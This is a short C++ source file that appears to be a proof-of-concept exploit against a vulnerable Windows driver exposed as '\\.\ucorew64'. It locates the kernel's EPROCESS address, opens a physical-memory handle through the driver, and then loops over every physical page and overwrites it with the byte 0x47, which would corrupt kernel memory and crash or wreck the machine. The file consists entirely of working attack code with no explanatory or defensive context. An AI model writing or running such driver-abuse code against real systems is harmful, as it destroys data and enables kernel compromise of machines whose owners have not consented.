#pragma comment(lib, "ntdll.lib") // link "ntdll.lib" for NtQuerySystemInformation()
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <stdio.h>
#include <string.h>

#include "rw_primitive.h"
#include "windows_helper_functions.h"


int main(char argc, char** argv)
{
	printf("\n\n\nEPROCESS_adress: %p\n", EPROCESS_address(ntoskernl_base()));
	HANDLE hPhys = nullptr;
	hPhys = GetDevicePhysicalMemoryHandle(L"\\\\.\\ucorew64");
	if (hPhys == NULL) {
		fprintf(stderr, "Could not obtain Device PhysicalMemory\n");
		exit(EXIT_FAILURE);
	}

	PDWORD64 buf = (PDWORD64)malloc(0x1000);
	if (buf == 0) {
		exit(EXIT_FAILURE);
	}

	for (__int64 page = 0; page < 0x7FFFFFFFFFFF; page = page + 0x1000) {
		MapPhysicalMemory(hPhys, page, 0x1000, buf);
		memset(buf, 0x47, 0x1000);
		printf("Set %lld to 0x47: \n", page);
	}

	free(buf);

	CloseHandle(hPhys);
	return EXIT_SUCCESS;
}